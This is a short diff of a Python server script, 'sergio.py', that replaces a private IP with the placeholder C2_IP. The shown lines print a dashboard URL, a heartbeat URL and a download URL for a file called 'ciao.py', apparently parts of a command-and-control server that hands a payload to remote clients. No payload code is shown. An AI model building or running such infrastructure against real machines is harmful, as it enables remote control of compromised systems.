@@ -1,5 +1,5 @@
 """
-sergio.py - Sergio Server (cs20 - 192.168.1.21)
+sergio.py - Sergio Server (cs20 - C2_IP)
 
 Porte:
   8080 - sergio: dashboard, heartbeat, result
@@ -214,9 +214,9 @@ if __name__ == "__main__":
     server = HTTPServer(("0.0.0.0", port), SergioHandler)
     print(f"[*] File server in ascolto su 0.0.0.0:{portserver}  (serve ciao.py)")
     print(f"[*] Sergio in ascolto su 0.0.0.0:{port}")
-    print(f"[*] Dashboard:  http://192.168.1.21:{port}/")
-    print(f"[*] Download:   http://192.168.1.21:{portserver}/ciao.py")
-    print(f"[*] Heartbeat:  http://192.168.1.21:{port}/heartbeat")
+    print(f"[*] Dashboard:  http://C2_IP:{port}/")
+    print(f"[*] Download:   http://C2_IP:{portserver}/ciao.py")
+    print(f"[*] Heartbeat:  http://C2_IP:{port}/heartbeat")
     try:
         server.serve_forever()
     except KeyboardInterrupt:
